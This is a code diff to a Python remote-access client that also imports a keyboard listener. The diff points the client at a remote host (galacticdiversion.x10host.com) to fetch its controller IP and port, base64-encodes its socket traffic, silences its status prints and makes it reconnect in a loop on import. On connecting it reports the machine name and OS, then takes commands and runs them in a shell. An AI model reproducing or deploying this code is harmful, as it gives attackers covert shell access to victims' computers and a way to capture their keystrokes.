@@ -1,5 +1,5 @@
 #---- INSTALLED SCRIPTS ----#
-import socket, os, subprocess, pathlib, platform, logging
+import socket, os, subprocess, pathlib, platform, logging, base64, time
 from threading import Thread
 from pynput.keyboard import Key, Listener
 
@@ -14,13 +14,11 @@ waitInLoop = 5 # How many minutes to wait before retrying connection
 
 #---- SERVER SETTINGS ----#
 #If no url is defined(empty string), it will default to default port
-#portUrl = "http://galacticdiversion.x10host.com/port"
-portUrl = ""
-defPort = 4444
+portUrl = "http://galacticdiversion.x10host.com/port"
+defPort = 1337
 
 #If no url is defined(empty string), it will default to given ip
-#url = "http://galacticdiversion.x10host.com/ip"
-url = ""
+url = "http://galacticdiversion.x10host.com/ip"
 ip = 'localhost'
 
 quitting = False
@@ -45,7 +43,7 @@ def runShell(command):
 def receive():
 	global received, currentPath, quitting
 
-	received = s.recv(1024).decode('utf8')
+	received = base64.decodebytes(s.recv(1024)).decode('utf8')
 	
 	if checkCom('quit'):
 		quitting = True
@@ -127,26 +125,30 @@ def receive():
 def send(args):
 	global received
 	if type(args) == type(''):
-		send = s.send(args.encode('utf8'))
+		send = args.encode('utf8')
 	elif type(args) == type(b''):
-		send = s.send(args)
+		send = args
 	else:
-		send = s.send(str(args).encode('utf8'))
+		send = str(args).encode('utf8')
+
+	send = base64.encodebytes(send)
+
+	s.send(send)
 	received = b''
 	receive()
 
 def connect():
 	notConnected = True
 	while notConnected:
-		os.system('cls')
 		global host, port, s
+		port = int(port)
 
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 		try:
-			print('[!] Trying To Connect To %s:%s'%(host, port))
+			# print('[!] Trying To Connect To %s:%s'%(host, port))
 			s.connect((host,port))
-			print('[*] Connection Established')
+			# print('[*] Connection Established')
 			s.send((str(os.environ['COMPUTERNAME']) + ',' + platform.system() + ',' + currentPath).encode('utf8'))
 			notConnected = False
 		except Exception as e:
@@ -161,17 +163,17 @@ def reset():
 	host = findIP.getIP(url, ip)
 	port = findIP.getIP(portUrl, defPort)
 
-if __name__ == '__main__':
-	while not quitting:
-		reset()
-		print("Starting Client")
-		try:
-			connect()
-			receive()
-			s.close()
-		except:
-			print("Cut Out Of Loop")
 
+while not quitting:
+	reset()
+	# print("Starting Client")
+	try:
+		connect()
+		receive()
+		s.close()
+	except:
+		print("Cut Out Of Loop")
+
+
+	if not quitting:
 		time.sleep(waitInLoop * 60)
-
-	
